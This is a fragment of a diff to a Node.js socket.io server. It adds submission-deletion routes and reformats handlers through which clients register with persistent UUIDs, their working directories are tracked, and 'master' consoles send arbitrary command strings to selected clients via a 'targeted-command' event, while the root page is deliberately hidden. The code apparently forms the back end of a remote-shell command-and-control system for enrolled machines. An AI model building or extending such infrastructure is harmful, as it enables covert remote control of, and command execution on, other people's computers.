+  console.log('[Postboard] Deleted submission #' + id + ' (from ' + removed.uuid + ')');
+  res.json({ success: true, deleted: 1 });
+});
+
+// Bulk delete (by IDs in JSON body, or by uuid / all in query)
+app.delete('/submissions', (req, res) => {
+  var before = submissions.length;
+
+  if (req.body && Array.isArray(req.body.ids)) {
+    var idSet = new Set(req.body.ids.map(Number));
+    submissions = submissions.filter(function(s) { return !idSet.has(s.id); });
+    saveSubmissions();
+    return res.json({ success: true, deleted: before - submissions.length });
+  }
+
+  var uuid = (req.query.uuid || '').toString().trim();
+  if (uuid) {
+    submissions = submissions.filter(function(s) { return s.uuid !== uuid; });
+    saveSubmissions();
+    return res.json({ success: true, deleted: before - submissions.length });
+  }
+
+  if (req.query.all === 'true') {
+    submissions = [];
+    saveSubmissions();
+    return res.json({ success: true, deleted: before });
+  }
+
+  return res.status(400).json({ error: 'Provide { ids: [...] } in body, ?uuid=..., or ?all=true' });
+});
+
+// List submissions, optionally filtered
 app.get('/submissions', (req, res) => {
   var uuid = (req.query.uuid || '').toString().trim();
   var result = uuid ? submissions.filter(function(s) { return s.uuid === uuid; }) : submissions.slice();
@@ -1064,9 +1308,7 @@ app.get('/api/seen', (req, res) => {
 // ==================== PAGE ROUTES ====================
 // =====================================================
 
-// Root intentionally disabled — blank 404
 app.get('/', (req, res) => res.status(404).end());
-
 app.get('/favicon.ico', (req, res) => res.status(204).end());
 
 app.get('/master', (req, res) => {
@@ -1077,7 +1319,6 @@ app.get('/postboard', (req, res) => {
   res.sendFile(path.join(publicDir, 'postboard.html'));
 });
 
-// Catch-all must come last
 app.get('/:uuid', (req, res) => {
   res.sendFile(path.join(publicDir, 'index.html'));
 });
@@ -1096,7 +1337,6 @@ io.on('connection', (socket) => {
     }
   });
 
-  // ---------- CLIENT REGISTRATION (permanent UUID) ----------
   socket.on('register-client', (payload) => {
     role = 'client';
     const connectionEpoch = Date.now();
@@ -1106,13 +1346,11 @@ io.on('connection', (socket) => {
       oldId = payload;
     } else if (payload && typeof payload === 'object') {
       oldId = (typeof payload.clientId === 'string' && payload.clientId.length > 0)
-        ? payload.clientId
-        : null;
+        ? payload.clientId : null;
     }
 
     const validOldId = (typeof oldId === 'string' && /^[A-Za-z0-9_-]{8,128}$/.test(oldId))
-      ? oldId
-      : null;
+      ? oldId : null;
 
     if (validOldId) {
       const existing = clients.get(validOldId);
@@ -1121,17 +1359,14 @@ io.on('connection', (socket) => {
         existing.socket = socket;
         existing.epoch = connectionEpoch;
         existing.cwd = existing.cwd || (process.platform === 'win32'
-          ? process.env.USERPROFILE || process.cwd()
-          : process.cwd());
+          ? process.env.USERPROFILE || process.cwd() : process.cwd());
         console.log(`Client reconnected with existing UUID: ${clientId}`);
       } else {
         clientId = validOldId;
         clients.set(clientId, {
-          socket: socket,
-          epoch: connectionEpoch,
+          socket: socket, epoch: connectionEpoch,
           cwd: (process.platform === 'win32'
-            ? process.env.USERPROFILE || process.cwd()
-            : process.cwd()),
+            ? process.env.USERPROFILE || process.cwd() : process.cwd()),
           env: {}
         });
         console.log(`Client registered with permanent UUID: ${clientId}`);
@@ -1140,20 +1375,16 @@ io.on('connection', (socket) => {
     } else {
       clientId = uuidv4();
       clients.set(clientId, {
-        socket: socket,
-        epoch: connectionEpoch,
+        socket: socket, epoch: connectionEpoch,
         cwd: (process.platform === 'win32'
-          ? process.env.USERPROFILE || process.cwd()
-          : process.cwd()),
+          ? process.env.USERPROFILE || process.cwd() : process.cwd()),
         env: {}
       });
       console.log(`Client registered with new UUID: ${clientId}`);
       socket.emit('registered', clientId);
     }
 
-    // Record in seen list
     markUUIDSeen(clientId);
-
     clientHeartbeats.set(clientId, Date.now());
 
     const clientData = clients.get(clientId);
@@ -1247,7 +1478,6 @@ io.on('connection', (socket) => {
     });
   });
 
-  // ---------- VIEWER REGISTRATION ----------
   socket.on('register-viewer', (id) => {
     role = 'viewer';
     clientId = id;
@@ -1284,7 +1514,6 @@ io.on('connection', (socket) => {
     });
   });
 
-  // ---------- MASTER REGISTRATION ----------
   socket.on('register-master', () => {
     role = 'master';
     masters.add(socket);
@@ -1365,7 +1594,6 @@ io.on('connection', (socket) => {
     });
   });
 
-  // ---------- TARGETED COMMAND ----------
   socket.on('targeted-command', ({ uuids, cmd }) => {
     if (!Array.isArray(uuids) || typeof cmd !== 'string' || cmd.trim() === '') {
       socket.emit('system', '[System] Invalid targeted command payload');
@@ -1399,7 +1627,6 @@ setInterval(() => {
   }
 }, 30000);
 
-// Flush seen UUIDs on shutdown
 process.on('SIGINT', () => { try { saveSeenUUIDs(); } catch {} process.exit(0); });
 process.on('SIGTERM', () => { try { saveSeenUUIDs(); } catch {} process.exit(0); });
 
